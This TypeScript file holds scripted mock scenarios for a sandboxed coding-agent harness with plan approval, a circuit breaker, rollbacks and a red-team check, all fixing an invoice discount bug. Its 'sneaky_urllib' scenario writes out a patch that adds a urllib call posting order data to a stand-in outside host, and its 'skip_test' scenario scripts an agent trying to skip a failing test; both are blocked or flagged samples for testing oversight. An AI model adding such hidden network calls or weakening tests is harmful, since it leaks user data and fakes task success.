/**
 * Scenario scripts for the mock API. `demo` replays the contract's sample stream with
 * live approvals; the others are built from the contract's types in the same shape as
 * the five scripted scenarios the backend will run (demo, sneaky_urllib, skip_test,
 * rollback, clarify). All numbers here are mock data: tokens are marked as estimated.
 */
import { readFileSync } from "node:fs";
import path from "node:path";
import type { Event, Plan, RedteamFinding } from "../../contract/events.ts";
import { approval, budget, choice, DENY_CHOICES, doneDraft, plan, step, type Draft } from "./builders.ts";
import type { MockRun } from "./run.ts";

export const SCENARIO_IDS = ["demo", "sneaky_urllib", "skip_test", "rollback", "clarify"] as const;
export type ScenarioId = (typeof SCENARIO_IDS)[number];

const SAMPLE_PATH = path.join(import.meta.dirname, "../../contract/samples/demo-run.jsonl");

function sample(): Event[] {
  return readFileSync(SAMPLE_PATH, "utf8")
    .split("\n")
    .filter((l) => l.trim() !== "")
    .map((l) => JSON.parse(l) as Event);
}

function strip(e: Event): Draft<Event> {
  const { id: _id, run_id: _run, ts: _ts, ...rest } = e;
  void _id;
  void _run;
  void _ts;
  return rest as Draft<Event>;
}

const PAUSE = { fast: 350, step: 900, slow: 1400 } as const;

/** The patch the scripted fix produces. `network` adds the sneaked-in code. */
export function patchText(network: boolean): string {
  const lines = [
    "diff --git a/invoice_calc/invoice.py b/invoice_calc/invoice.py",
    "--- a/invoice_calc/invoice.py",
    "+++ b/invoice_calc/invoice.py",
    "@@ -32,7 +32,7 @@",
    ' """Reduce ``amount`` by ``percent`` percent."""',
    " if not 0 <= percent <= 100:",
    '     raise ValueError("discount must be between 0 and 100")',
    "-return amount - Decimal(percent)",
    "+return amount - amount * Decimal(percent) / Decimal(100)",
  ];
  if (network) {
    lines.splice(
      4,
      0,
      "@@ -1,3 +1,6 @@",
      "+import urllib.request",
      "+",
      '+urllib.request.urlopen("https://collector.example.net/ping", data=b"order")',
    );
  }
  return `${lines.join("\n")}\n`;
}

export function reportMarkdown(runId: string, events: readonly Event[]): string {
  const done = events.find((e) => e.kind === "done");
  return [
    `# Sandcage report for run ${runId.slice(0, 6)}`,
    "",
    "This report comes from the mock API and describes a scripted run.",
    "",
    `Status: ${done && done.kind === "done" ? done.status : "running"}`,
    `Steps: ${events.filter((e) => e.kind === "step").length}`,
    `Blocked: ${events.filter((e) => e.kind === "step" && e.blocked).length}`,
    "",
  ].join("\n");
}

export interface ScenarioContext {
  run: MockRun;
  scenario: ScenarioId;
  /** Whether the person asked for the plan to need approval. */
  approvePlan: boolean;
}

export async function runScenario(ctx: ScenarioContext): Promise<void> {
  switch (ctx.scenario) {
    case "demo":
      return demo(ctx);
    case "sneaky_urllib":
      return sneaky(ctx);
    case "skip_test":
      return skipTest(ctx);
    case "rollback":
      return rollback(ctx);
    case "clarify":
      return clarify(ctx);
  }
}

// ---------------------------------------------------------------------------

function endEarly(run: MockRun, status: "plan_rejected" | "killed" | "needs_clarification", summary: string, p: Plan | null): void {
  run.emit(doneDraft({ status, summary, plan: p }));
}

async function demo({ run }: ScenarioContext): Promise<void> {
  const events = sample();
  let lastPlan: Plan | null = null;
  for (const e of events) {
    if (e.kind === "approval_resolved") continue; // the run records the real answer
    if (e.kind === "plan" && e.plan) lastPlan = e.plan;
    if (e.kind === "approval_needed") {
      const answer = await run.ask(e.approval);
      if (!answer.choice.approves && e.approval.kind === "plan") {
        run.emit({ ...strip(events.find((x) => x.kind === "plan" && x.state === "proposed") as Event), state: "rejected" } as Draft<Event>);
        return endEarly(run, "plan_rejected", "The plan was not approved, so the agent never started.", lastPlan);
      }
      if (!answer.choice.approves && e.approval.kind === "breaker") {
        run.emit({ kind: "breaker", phase: "act", state: "killed", reason: "Ended by a human at the breaker.", source: "README.md", denials: 2, injection_denials: 2, trips: 1 });
        return endEarly(run, "killed", "The run was ended at the circuit breaker. Nothing was delivered.", lastPlan);
      }
      continue;
    }
    if (e.kind === "breaker" && e.state === "resumed") {
      run.emit(strip(e));
      continue;
    }
    await run.sleep(e.kind === "step" ? PAUSE.step : PAUSE.fast);
    const draft = strip(e);
    if (e.kind === "done" && e.status === "finished") {
      run.outputs = { patch: patchText(false), blocked: false, released: false };
    }
    run.emit(draft);
  }
}

// ---------------------------------------------------------------------------

const FIX_PLAN_REASONS = ["a one-line arithmetic fix"];

async function understandAndPlan(run: MockRun, approvePlan: boolean, task: string, risk: Plan["risk"] = "low"): Promise<Plan | null> {
  run.emit({
    kind: "understand",
    phase: "understand",
    state: "understood",
    task,
    done_criteria: ["The failing discount test passes", "No other test breaks"],
    question: null,
    answer: null,
    valid: true,
  });
  await run.sleep(PAUSE.fast);
  run.emit({ kind: "scout", phase: "scout", flags: [], files_mapped: 6, model_calls: 1, skipped: [], test_command: "pytest -q", test_command_source: "pytest.ini", ignored_hints: [] });
  await run.sleep(PAUSE.fast);
  const p = plan(risk, FIX_PLAN_REASONS);
  const planEvent = (state: "proposed" | "approved" | "locked" | "rejected", byHuman: boolean) =>
    ({ kind: "plan", phase: state === "locked" ? "plan" : state === "proposed" ? "plan" : "approve", state, plan: p, scout_flags: [], approval_required: approvePlan || risk === "high", approved_by_human: byHuman, added: null, error: null }) as Draft<Event>;
  run.emit(planEvent("proposed", false));
  if (approvePlan || risk === "high") {
    const a = await run.ask(
      approval({
        id: "plan:0",
        kind: "plan",
        step: 0,
        phase: "approve",
        eyebrow: "APPROVE THE PLAN",
        headline: risk === "high" ? "Approve the plan before work starts, it's high risk." : "Approve the plan before work starts.",
        body: [
          { type: "facts", rows: [{ label: "May edit", value: "invoice_calc/**", mono: true }, { label: "May run", value: "pytest, python, ls, cat", mono: true }, { label: "Network", value: "none", mono: true }] },
        ],
        choices: [choice("approve", "Approve plan", true, true, "A"), choice("deny", "Deny", false, false, "D")],
        on_timeout: "deny",
        timeout_text: "timed out: counts as deny",
      }),
    );
    if (!a.choice.approves) {
      run.emit(planEvent("rejected", false));
      endEarly(run, "plan_rejected", "The plan was not approved, so the agent never started.", p);
      return null;
    }
    run.emit(planEvent("approved", true));
  } else {
    run.emit(planEvent("approved", false));
  }
  run.emit(planEvent("locked", approvePlan || risk === "high"));
  await run.sleep(PAUSE.fast);
  return p;
}

interface TailOptions {
  plan: Plan;
  blocked: number;
  findings?: RedteamFinding[];
  network?: boolean;
  steps: number;
  rollbacks?: number;
  checkpoints?: number;
  verifyAttempts?: number;
}

/** Verify, red-team, deliver, report, learn and done, with a red-team release question. */
async function tail(run: MockRun, o: TailOptions): Promise<void> {
  const seconds = 10 + o.steps * 4;
  await run.sleep(PAUSE.fast);
  run.emit({
    kind: "verify",
    phase: "verify",
    budget: budget(o.steps, seconds),
    attempt: 1,
    passed: true,
    reasons: [],
    checks: [
      { name: "tests pass", passed: true, detail: "5 passed" },
      { name: "only planned files changed", passed: true, detail: "" },
      { name: "no secrets in the diff", passed: true, detail: "" },
      { name: "tests not weakened", passed: true, detail: "" },
    ],
    judged_by_model: true,
    tests: { command: "pytest -q", exit_code: 0, passed: true, timed_out: false },
  });
  await run.sleep(PAUSE.fast);
  const findings = o.findings ?? [];
  const high = findings.filter((f) => f.severity === "high" || f.severity === "critical");
  let withheld = high.length > 0;
  let released = false;
  run.emit({ kind: "redteam", phase: "redteam", findings, blocked: withheld, unreviewed: false, skipped_reason: null });
  if (withheld) {
    const a = await run.ask(
      approval({
        id: "redteam:0",
        kind: "redteam",
        step: o.steps,
        phase: "redteam",
        eyebrow: "RED-TEAM",
        headline: "The red-team found high-severity issues. Release the patch anyway?",
        body: [{ type: "findings", items: high.map((f) => ({ location: f.line === null ? f.file : `${f.file}:${f.line}`, text: f.explanation })) }],
        choices: [choice("keep", "Keep it blocked", false, true, null), choice("release", "Release patch", true, false, null)],
        on_timeout: "keep",
        timeout_text: "timed out: counts as keep it blocked",
      }),
    );
    if (a.choice.approves) {
      withheld = false;
      released = true;
    }
  }
  run.outputs = { patch: patchText(o.network ?? false), blocked: withheld, released };
  run.emit({ kind: "deliver", phase: "deliver", files: ["invoice_calc/invoice.py"], excluded: [], blocked: withheld, released_by_human: released, patch_bytes: run.outputs.patch?.length ?? 0 });
  run.emit({
    kind: "report",
    phase: "report",
    trifecta: { private_data: false, untrusted_content: false, way_out: false, all_at_once: false },
    blocks: o.blocked,
    capabilities: [
      { capability: "read files", attempted: 3, executed: 3, blocked: 0 },
      { capability: "write files", attempted: 1 + o.blocked, executed: 1, blocked: o.blocked },
      { capability: "run commands", attempted: 2, executed: 2, blocked: 0 },
      { capability: "network", attempted: 0, executed: 0, blocked: 0 },
    ],
  });
  run.emit({ kind: "learn", phase: "learn", suggestions: [], notes: [] });
  run.emit(
    doneDraft({
      status: "finished",
      summary: "Fixed the discount: it now takes the percentage off.",
      steps: o.steps,
      budget: budget(o.steps, seconds + 6),
      counts: { allowed: o.steps - o.blocked, denied: o.blocked, asked: 0, injection_tagged: 0 },
      plan: o.plan,
      verified: true,
      rollbacks: o.rollbacks ?? 0,
      checkpoints: o.checkpoints ?? 1,
      delivered: !withheld,
      delivery_blocked: withheld,
      released_by_human: released,
      changed_files: ["invoice_calc/invoice.py"],
      final_tests: { command: "pytest -q", exit_code: 0, passed: true, timed_out: false },
    }),
  );
}

const FIX_WRITE = { path: "invoice_calc/invoice.py", content: "…\n    return amount - amount * percent / Decimal(100)\n…" };

async function sneaky({ run, approvePlan }: ScenarioContext): Promise<void> {
  const p = await understandAndPlan(run, approvePlan, "Fix the failing discount test.");
  if (!p) return;
  const s = (n: number, spec: Parameters<typeof step>[0]) => run.emit(step({ ...spec, step: n, seconds: 4 * n }));
  s(1, { step: 1, tool: "list_dir", args: { path: "." }, reason: "Look at the files in the repo", seconds: 0, output_preview: "README.md\ninvoice_calc/\n…" });
  await run.sleep(PAUSE.step);
  s(2, { step: 2, tool: "read_file", args: { path: "invoice_calc/invoice.py" }, reason: "Read the discount code", seconds: 0 });
  await run.sleep(PAUSE.step);
  const ask = await run.ask(
    approval({
      id: "action:3",
      kind: "action",
      step: 3,
      phase: "act",
      eyebrow: "NEEDS YOUR CALL",
      headline: "The agent wants to do something the plan doesn't cover.",
      body: [
        { type: "code", text: "write_file invoice_calc/invoice.py" },
        { type: "text", text: "This edit adds code that can reach the network or run programs, so a human must review it.", muted: false },
      ],
      choices: DENY_CHOICES("Allow once"),
      on_timeout: "deny",
      timeout_text: "timed out: counts as deny",
    }),
  );
  const approved = ask.choice.approves;
  s(3, {
    step: 3,
    tool: "write_file",
    args: { path: "invoice_calc/invoice.py", content: "import urllib.request\n…" },
    reason: "Fix the discount and log the order",
    decision: "ask",
    rule_id: "diff.ask_network_exec",
    rule_reason: "This edit adds code that can reach the network or run programs, so a human must review it.",
    risk: "high",
    approved,
    executed: approved,
    checkpoint: approved ? 1 : null,
    blocked_sentence: "Tried to add network code to invoice_calc/invoice.py",
    seconds: 12,
  });
  if (approved) run.emit({ kind: "checkpoint", phase: "act", checkpoint: 1, state: "saved", files: ["invoice_calc/invoice.py"], step: 3, restored_by: null, error: null });
  await run.sleep(PAUSE.step);
  if (!approved) s(4, { step: 4, tool: "write_file", args: FIX_WRITE, reason: "Fix the discount only", seconds: 16, checkpoint: 1 });
  s(5, { step: 5, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests again", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "5 passed", seconds: 20 });
  s(6, { step: 6, tool: "finish", args: { summary: "Fixed the discount." }, reason: "Done", rule_id: "tool.allow_finish", rule_reason: "Finishing the run is allowed.", seconds: 24 });
  const findings: RedteamFinding[] = approved
    ? [{ severity: "high", file: "invoice_calc/invoice.py", line: 3, explanation: "The fix imports urllib and posts each order to an outside address." }]
    : [];
  await tail(run, { plan: p, blocked: approved ? 0 : 1, findings, network: approved, steps: approved ? 5 : 6, checkpoints: 1 });
}

async function skipTest({ run, approvePlan }: ScenarioContext): Promise<void> {
  const p = await understandAndPlan(run, approvePlan, "Make the failing test pass.");
  if (!p) return;
  const e = (spec: Parameters<typeof step>[0]) => run.emit(step(spec));
  e({ step: 1, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "1 failed, 4 passed", seconds: 4 });
  await run.sleep(PAUSE.step);
  e({ step: 2, tool: "write_file", args: { path: "tests/test_invoice.py", content: "…skip…" }, reason: "Mark the test as skipped", decision: "deny", rule_id: "diff.deny_weakened_tests", rule_reason: "Weakening the tests is blocked; fix the code instead.", risk: "high", blocked_sentence: "Tried to weaken the tests in tests/test_invoice.py", seconds: 8, breaker: { denials: 1, injection_denials: 0, trips: 0 } });
  await run.sleep(PAUSE.step);
  e({ step: 3, tool: "write_file", args: FIX_WRITE, reason: "Fix the discount code instead", checkpoint: 1, seconds: 12 });
  run.emit({ kind: "checkpoint", phase: "act", checkpoint: 1, state: "saved", files: ["invoice_calc/invoice.py"], step: 3, restored_by: null, error: null });
  e({ step: 4, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests again", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "5 passed", seconds: 16 });
  e({ step: 5, tool: "finish", args: { summary: "Fixed the discount." }, reason: "Done", rule_id: "tool.allow_finish", rule_reason: "Finishing the run is allowed.", seconds: 20 });
  await tail(run, { plan: p, blocked: 1, steps: 5 });
}

async function rollback({ run, approvePlan }: ScenarioContext): Promise<void> {
  const p = await understandAndPlan(run, approvePlan, "Make the failing test pass.");
  if (!p) return;
  const e = (spec: Parameters<typeof step>[0]) => run.emit(step(spec));
  const cp = (n: number, st: number | null, state: "saved" | "restored") =>
    run.emit({ kind: "checkpoint", phase: "act", checkpoint: n, state, files: ["invoice_calc/invoice.py"], step: st, restored_by: state === "restored" ? "agent" : null, error: null });
  e({ step: 1, tool: "write_file", args: { path: "invoice_calc/invoice.py", content: "…return total…" }, reason: "Simplify the discount", checkpoint: 1, seconds: 4 });
  cp(1, 1, "saved");
  await run.sleep(PAUSE.step);
  e({ step: 2, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "3 failed, 2 passed", seconds: 8 });
  await run.sleep(PAUSE.step);
  e({ step: 3, tool: "rollback", args: { checkpoint: 0 }, reason: "That broke more tests; go back", rule_id: "tool.allow_rollback", rule_reason: "Restoring an earlier checkpoint of this run is allowed.", seconds: 12 });
  cp(0, null, "restored");
  await run.sleep(PAUSE.step);
  e({ step: 4, tool: "write_file", args: FIX_WRITE, reason: "Take the percentage off", checkpoint: 2, seconds: 16 });
  cp(2, 4, "saved");
  e({ step: 5, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests again", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "5 passed", seconds: 20 });
  e({ step: 6, tool: "finish", args: { summary: "Fixed the discount." }, reason: "Done", rule_id: "tool.allow_finish", rule_reason: "Finishing the run is allowed.", seconds: 24 });
  await tail(run, { plan: p, blocked: 0, steps: 6, rollbacks: 1, checkpoints: 3 });
}

async function clarify({ run, approvePlan }: ScenarioContext): Promise<void> {
  const question = "Is the discount a percentage off (10 means 10%) or a fixed amount off?";
  run.emit({ kind: "understand", phase: "understand", state: "asking", task: "Fix the discount.", done_criteria: [], question, answer: null, valid: true });
  const a = await run.ask(
    approval({
      id: "question:0",
      kind: "question",
      step: 0,
      phase: "understand",
      eyebrow: "A QUESTION BEFORE THE AGENT STARTS",
      headline: question,
      body: [],
      choices: [choice("answer", "Answer", true, true, null), choice("stop", "Stop the run", false, false, null)],
      free_text: { label: question, placeholder: "Your answer", max_length: 1000, required: true },
      layout: "question",
      on_timeout: "stop",
      timeout_text: "timed out: counts as stop",
    }),
  );
  if (!a.choice.approves || !a.text) {
    run.emit({ kind: "understand", phase: "understand", state: "unanswered", task: "Fix the discount.", done_criteria: [], question, answer: null, valid: true });
    return endEarly(run, "needs_clarification", "The agent needed an answer and did not get one, so it did not start.", null);
  }
  run.emit({ kind: "understand", phase: "understand", state: "answered", task: "Fix the discount.", done_criteria: ["The failing discount test passes"], question, answer: a.text, valid: true });
  const p = await understandAndPlan(run, approvePlan, "Fix the discount.");
  if (!p) return;
  const e = (spec: Parameters<typeof step>[0]) => run.emit(step(spec));
  e({ step: 1, tool: "read_file", args: { path: "invoice_calc/invoice.py" }, reason: "Read the discount code", seconds: 4 });
  await run.sleep(PAUSE.step);
  e({ step: 2, tool: "write_file", args: FIX_WRITE, reason: "Take the percentage off", checkpoint: 1, seconds: 8 });
  run.emit({ kind: "checkpoint", phase: "act", checkpoint: 1, state: "saved", files: ["invoice_calc/invoice.py"], step: 2, restored_by: null, error: null });
  e({ step: 3, tool: "run_command", args: { command: "pytest -q" }, reason: "Run the tests", rule_id: "cmd.allow_safe", rule_reason: "Running python, pytest, ls and cat in the sandbox is allowed.", output_preview: "5 passed", seconds: 12 });
  e({ step: 4, tool: "finish", args: { summary: "Fixed the discount." }, reason: "Done", rule_id: "tool.allow_finish", rule_reason: "Finishing the run is allowed.", seconds: 16 });
  await tail(run, { plan: p, blocked: 0, steps: 4 });
}
